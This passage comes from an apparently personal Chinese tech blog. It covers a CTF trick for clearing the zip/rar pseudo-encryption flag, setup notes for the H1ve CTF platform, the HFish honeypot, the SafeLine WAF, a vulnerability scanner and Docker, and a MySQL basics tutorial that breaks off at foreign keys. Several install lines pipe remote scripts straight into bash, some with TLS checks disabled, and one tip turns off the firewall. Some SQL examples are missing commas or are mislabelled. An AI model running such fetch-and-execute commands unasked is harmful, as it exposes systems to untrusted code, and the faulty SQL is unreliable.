<h4 id="rar-zip伪加密"><a href="#rar-zip伪加密" class="headerlink" title="rar,zip伪加密"></a>rar,zip伪加密</h4><p><img src="/2023/09/27/misc/Users\tong\Pictures\20190912082104676.png"></p>
<p><img src="/2023/09/27/misc/Users\tong\Pictures\20201029104722308.png"></p>
<p>找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/21/%E9%9A%8F%E7%AC%94/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/21/%E9%9A%8F%E7%AC%94/" class="post-title-link" itemprop="url">随笔</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-21 13:54:35" itemprop="dateCreated datePublished" datetime="2023-09-21T13:54:35+08:00">2023-09-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:36:58" itemprop="dateModified" datetime="2025-01-10T18:36:58+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="H1ve平台搭建"><a href="#H1ve平台搭建" class="headerlink" title="H1ve平台搭建"></a>H1ve平台搭建</h3><p>H1ve最快捷的部署方式直接用docker搭建就好了，所以我们首先需要安装<strong>docker</strong>和<strong>docker-compose</strong></p>
<h5 id="常见问题解决-Issues-·-D0g3-Lab-x2F-H1ve-·-GitHub"><a href="#常见问题解决-Issues-·-D0g3-Lab-x2F-H1ve-·-GitHub" class="headerlink" title="常见问题解决   Issues · D0g3-Lab&#x2F;H1ve · GitHub"></a>常见问题解决   <a target="_blank" rel="noopener" href="https://github.com/D0g3-Lab/H1ve/issues?page=1&q=is:issue+is:open">Issues · D0g3-Lab&#x2F;H1ve · GitHub</a></h5><h4 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1.docker安装"></a>1.<strong>docker安装</strong></h4><h5 id="centos："><a href="#centos：" class="headerlink" title="centos："></a><strong>centos</strong>：</h5><p>sudo yum install -y git （安装git，一会要拉取源代码）</p>
<p>yum update（升级一下yum，防止版本太低）</p>
<p>yum install -y yum-utils device-mapper-persistent-data lvm2 （安装必须的东西）</p>
<p>sudo yum-config-manager –add-repo <a target="_blank" rel="noopener" href="https://download.docker.com/linux/centos/docker-ce.repo">https://download.docker.com/linux/centos/docker-ce.repo</a> （设置yum源）</p>
<p>sudo yum install docker-ce （安装docker）</p>
<p>systemctl start docker （启动docker）</p>
<p>systemctl enable docker （设置开机自启）</p>
<h5 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu:"></a><strong>ubuntu</strong>:</h5><p> sudo apt-get update（更新一下）</p>
<p> sudo apt-get upgrade （更新一下）</p>
<p>sudo apt-get install docker.io -y （安装docker）</p>
<p>systemctl start docker （启动docker）</p>
<p>systemctl enable docker （设置开机自启）</p>
<h4 id="2-docker-compose安装"><a href="#2-docker-compose安装" class="headerlink" title="2.docker-compose安装"></a>2.<strong>docker-compose安装</strong></h4><p><strong>ubuntu</strong>和<strong>centos</strong>一样:</p>
<p> (下载并且安装)</p>
<p>curl -L “<a target="_blank" rel="noopener" href="https://github.com/docker/compose/releases/download/1.27.2/docker-compose-$">https://github.com/docker/compose/releases/download/1.27.2/docker-compose-$</a>(uname -s)-$(uname -m)” -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</p>
<p>（赋予权限）</p>
<p>chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose </p>
<p>（查看版本，应该是1.2x.x）</p>
<p>docker-compose -version </p>
<h4 id="3-安装H1ve（ubuntu和centos一样）"><a href="#3-安装H1ve（ubuntu和centos一样）" class="headerlink" title="3.安装H1ve（ubuntu和centos一样）"></a>3.安装H1ve（ubuntu和centos一样）</h4><p>git clone <a target="_blank" rel="noopener" href="https://github.com/D0g3-Lab/H1ve.git">https://github.com/D0g3-Lab/H1ve.git</a> （拉取源代码）</p>
<p>cd H1ve （进入目录）</p>
<p>运行前要修改数据库版本</p>
<p>docker-compose -f single.yml up （跑起）</p>
<p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-09-17 201855.png)</p>
<h3 id="Hfish蜜罐搭建-docker"><a href="#Hfish蜜罐搭建-docker" class="headerlink" title="Hfish蜜罐搭建(docker)"></a>Hfish蜜罐搭建(docker)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker search hfish</span><br><span class="line">docker pull imdevops/hfish</span><br><span class="line">docker run -d --name hfish -p 21:21 -p 22:22 -p 23:23 -p 69:69 -p 3306:3306 -p 5900:5900 -p 6379:6379 -p 8080:8080 -p 8081:8081 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 9200:9200 -p 11211:11211 --restart=always imdevops/hfish:latest</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/">如何正确使用Docker出一道CTF题目 - Von的博客 | Von Blog (v0n.top)</a></p>
<h3 id="hexo迁移"><a href="#hexo迁移" class="headerlink" title="hexo迁移"></a>hexo迁移</h3><p>首先配置好git,node环境</p>
<p>设置github用户认证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;你的名字&quot;（注意前边是“- -global”，有两个横线）</span><br><span class="line">git config --global user.email &quot;你的邮箱&quot;</span><br></pre></td></tr></table></figure>

<p>npm换源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>

<p>安装hexo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>进入 Blog 目录（拷贝到新电脑的目录），输入下面指令安装相关模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm installnpm install hexo-deployer-git --save  // 文章部署到 git 的模块（下面为选择安装）</span><br><span class="line">npm install hexo-generator-feed --save  // 建立 RSS 订阅</span><br><span class="line">npm install hexo-generator-sitemap --save // 建立站点地图</span><br></pre></td></tr></table></figure>

<p>hexo三连</p>
<h3 id="HFfish"><a href="#HFfish" class="headerlink" title="HFfish"></a>HFfish</h3><h4 id="1-放行端口或关闭防火墙"><a href="#1-放行端口或关闭防火墙" class="headerlink" title="1. 放行端口或关闭防火墙"></a>1. 放行端口或关闭防火墙</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">放通4433、4434端口命令</span><br><span class="line">firewall-cmd --add-port=4433/tcp --permanent   #（用于web界面启动）</span><br><span class="line">firewall-cmd --add-port=4434/tcp --permanent   #（用于节点与管理端通信）</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CentOS 7 关闭防火墙命令</span><br><span class="line">systemctl stop firewalld.service    #关闭防火墙</span><br><span class="line">systemctl disable firewalld   #禁止开机启动防火墙</span><br></pre></td></tr></table></figure>

<h4 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sS -L https://hfish.net/webinstall.sh)</span><br></pre></td></tr></table></figure>



<h3 id="雷池waf安装"><a href="#雷池waf安装" class="headerlink" title="雷池waf安装"></a>雷池waf安装</h3><h4 id="1-在线安装"><a href="#1-在线安装" class="headerlink" title="1. 在线安装"></a>1. 在线安装</h4><p>复制以下命令执行，即可完成安装</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;<span class="subst">$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果需要使用华为云加速，可使用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDN=1 bash -c <span class="string">&quot;<span class="subst">$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果需要安装最新版本流式检测模式，可使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STREAM=1 bash -c &quot;$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)&quot;</span><br></pre></td></tr></table></figure>



<h3 id="碎遮-SZhe-Scan"><a href="#碎遮-SZhe-Scan" class="headerlink" title="碎遮  SZhe Scan"></a>碎遮  SZhe Scan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Cl0udG0d/SZhe_Scan</span><br><span class="line">cd SZhe_Scan</span><br><span class="line">docker-compose up -d  或 docker-compose up --build</span><br><span class="line">运行结束后访问 http://ip:5000</span><br></pre></td></tr></table></figure>

<p>docker换源</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error； pulling image configuration: download failed after attempts=6: dial tcp 104.16.100.207:443: i/o timeout</span><br><span class="line"></span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://yxzrazem.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h4 id="防火墙常用命令"><a href="#防火墙常用命令" class="headerlink" title="防火墙常用命令"></a>防火墙常用命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.systemctl start firewalld.service（开启防火墙）</span><br><span class="line"></span><br><span class="line">2.systemctl stop firewalld.service（关闭防火墙）</span><br><span class="line"></span><br><span class="line">3.service firewalld restart（从启防火墙）</span><br><span class="line"></span><br><span class="line">4.firewall-cmd --zone=public --add-port=4400-4600/udp --permanen(指定端口范围为4400-4600通过防火墙)</span><br><span class="line"></span><br><span class="line">Warning: ALREADY_ENABLED: 3306:tcp（说明3306端口通过成功）</span><br><span class="line"></span><br><span class="line">5.firewall-cmd --zone=public --remove-port=80/tcp --permanent（关闭指定端口）</span><br><span class="line"></span><br><span class="line">6.firewall-cmd --zone=public --list-ports（查看通过的端口）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Windows下如何查看某个端口被谁占用"><a href="#Windows下如何查看某个端口被谁占用" class="headerlink" title="Windows下如何查看某个端口被谁占用"></a>Windows下如何查看某个端口被谁占用</h3><p>这里我们以8081端口为例讲解。</p>
<ol>
<li>按下Win+R调出命令行窗口，输入netstat -aon|findstr “8081”，找到指定行最后一列的数字（PID），我们这里是9548.</li>
<li>输入tasklist|findstr “9548”，发现是javaw.exe占用了8081端口。</li>
<li>再次输入taskkill &#x2F;f &#x2F;t &#x2F;im javaw.exe结束该进程。</li>
</ol>
<p> hexo迁移</p>
<p>首先配置好git,node环境</p>
<p>设置github用户认证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;你的名字&quot;（注意前边是“- -global”，有两个横线）</span><br><span class="line">git config --global user.email &quot;你的邮箱&quot;</span><br></pre></td></tr></table></figure>

<p>npm换源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>

<p>安装hexo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>进入 Blog 目录（拷贝到新电脑的目录），输入下面指令安装相关模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm installnpm install hexo-deployer-git --save  // 文章部署到 git 的模块（下面为选择安装）</span><br><span class="line">npm install hexo-generator-feed --save  // 建立 RSS 订阅</span><br><span class="line">npm install hexo-generator-sitemap --save // 建立站点地图</span><br></pre></td></tr></table></figure>

<p>hexo三连</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/09/%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88Mysql)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/09/%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88Mysql)/" class="post-title-link" itemprop="url">MySQL数据库</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-08-09 18:49:11" itemprop="dateCreated datePublished" datetime="2023-08-09T18:49:11+08:00">2023-08-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-11 11:55:46" itemprop="dateModified" datetime="2025-01-11T11:55:46+08:00">2025-01-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="1-数据库的基本操作"><a href="#1-数据库的基本操作" class="headerlink" title="1.数据库的基本操作"></a>1.数据库的基本操作</h3><p>MySQL安装完成后，要想将数据存储到数据库的表中，首先要创建一个数据库。创 建数据库就是在数据库系统中划分一块空间存储数据，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database 数据库名称;</span><br></pre></td></tr></table></figure>

<p>创建一个叫db1的数据库MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建一个叫db1的数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database db1;</span><br></pre></td></tr></table></figure>

<p>创建数据库后查看该数据库基本信息MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database db1;</span><br></pre></td></tr></table></figure>

<p>删除数据库MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> database db1;</span><br></pre></td></tr></table></figure>

<p>查询出MySQL中所有的数据库MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure>

<p>将数据库的字符集修改为gbk MySQL命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> database db1 <span class="type">character</span> <span class="keyword">set</span> gbk;</span><br></pre></td></tr></table></figure>

<p>切换数据库 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use db1;</span><br></pre></td></tr></table></figure>

<p>查看当前使用的数据库 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure>

<h3 id="2-数据表的基本操作"><a href="#2-数据表的基本操作" class="headerlink" title="2.数据表的基本操作"></a>2.数据表的基本操作</h3><p>数据库创建成功后可在该数据库中创建数据表(简称为表)存储数据。请注意：在操作数据表之前应使用“USE 数据库名;”指定操作是在哪个数据库中进行先关操作，否则会抛出“No database selected”错误。<br>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">         字段<span class="number">1</span> 字段类型,</span><br><span class="line">         字段<span class="number">2</span> 字段类型,</span><br><span class="line">         …</span><br><span class="line">         字段n 字段类型</span><br><span class="line">);</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>

<h4 id="2-1-创建数据表"><a href="#2-1-创建数据表" class="headerlink" title="2.1 创建数据表"></a>2.1 创建数据表</h4><p>示例：创建学生表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line">birthday <span class="type">date</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="2-2-查看数据表"><a href="#2-2-查看数据表" class="headerlink" title="2.2 查看数据表"></a>2.2 查看数据表</h4><p>示例：查看当前数据库中所有表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>


<p>示例：查表的基本信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> student;</span><br></pre></td></tr></table></figure>

<p>示例：查看表的字段信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> student;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-修改数据表"><a href="#2-3-修改数据表" class="headerlink" title="2.3 修改数据表"></a>2.3 修改数据表</h4><p>有时，希望对表中的某些信息进行修改，例如：修改表名、修改字段名、修改字段 数据类型…等等。在MySQL中使用alter table修改数据表.<br>示例：修改表名 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student rename <span class="keyword">to</span> stu;</span><br></pre></td></tr></table></figure>

<p>示例：修改字段名 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu change name sname <span class="type">varchar</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>示例：修改字段数据类型 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify sname <span class="type">int</span>;</span><br></pre></td></tr></table></figure>

<p>示例：增加字段 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> address <span class="type">varchar</span>(<span class="number">50</span>);</span><br></pre></td></tr></table></figure>

<p>示例：删除字段 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">drop</span> address;</span><br></pre></td></tr></table></figure>

<h4 id="2-4-删除数据表"><a href="#2-4-删除数据表" class="headerlink" title="2.4 删除数据表"></a>2.4 删除数据表</h4><p>语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名;</span><br></pre></td></tr></table></figure>

<p>示例：删除数据表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br></pre></td></tr></table></figure>

<h2 id="五、数据表的约束"><a href="#五、数据表的约束" class="headerlink" title="五、数据表的约束"></a>五、数据表的约束</h2><p>为防止错误的数据被插入到数据表，MySQL中定义了一些维护数据库完整性的规则；这些规则常称为表的约束。常见约束如下：</p>
<table>
<thead>
<tr>
<th>约束条件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>PRIMARY KEY</td>
<td>主键约束用于唯一标识对应的记录</td>
</tr>
<tr>
<td>FOREIGN KEY</td>
<td>外键约束</td>
</tr>
<tr>
<td>NOT NULL</td>
<td>非空约束</td>
</tr>
<tr>
<td>UNIQUE</td>
<td>唯一性约束</td>
</tr>
<tr>
<td>DEFAULT</td>
<td>默认值约束，用于设置字段的默认值</td>
</tr>
<tr>
<td>以上五种约束条件针对表中字段进行限制从而保证数据表中数据的正确性和唯一性。换句话说，表的约束实际上就是表中数据的限制条件。</td>
<td></td>
</tr>
</tbody></table>
<h3 id="1-主键约束"><a href="#1-主键约束" class="headerlink" title="1.主键约束"></a>1.主键约束</h3><p>主键约束即primary key用于唯一的标识表中的每一行。被标识为主键的数据在表中是唯一的且其值不能为空。这点类似于我们每个人都有一个身份证号，并且这个身份证号是唯一的。<br>主键约束基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">primary</span> key;</span><br></pre></td></tr></table></figure>

<p><strong>设置主键约束(primary key)的第一种方式</strong><br>示例：MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>设置主键约束(primary key)的第二·种方式</strong><br>示例：MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student01(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="2-非空约束"><a href="#2-非空约束" class="headerlink" title="2.非空约束"></a>2.非空约束</h3><p>非空约束即 NOT NULL指的是字段的值不能为空，基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>示例：MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student02(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="3-默认值约束"><a href="#3-默认值约束" class="headerlink" title="3.默认值约束"></a>3.默认值约束</h3><p>默认值约束即DEFAULT用于给数据表中的字段指定默认值，即当在表中插入一条新记录时若未给该字段赋值，那么，数据库系统会自动为这个字段插入默认值；其基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">DEFAULT</span> 默认值；</span><br></pre></td></tr></table></figure>

<p>示例：MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student03(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">default</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="5-唯一性约束"><a href="#5-唯一性约束" class="headerlink" title="5.唯一性约束"></a>5.唯一性约束</h3><p>唯一性约束即UNIQUE用于保证数据表中字段的唯一性，即表中字段的值不能重复出现，其基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">UNIQUE</span>;</span><br></pre></td></tr></table></figure>

<p>示例：MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student04(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">unique</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="6-外键约束"><a href="#6-外键约束" class="headerlink" title="6.外键约束"></a>6.外键约束</h3><p>外键约束即FOREIGN KEY常用于多张表之间的约束。基本语法如下：</p>
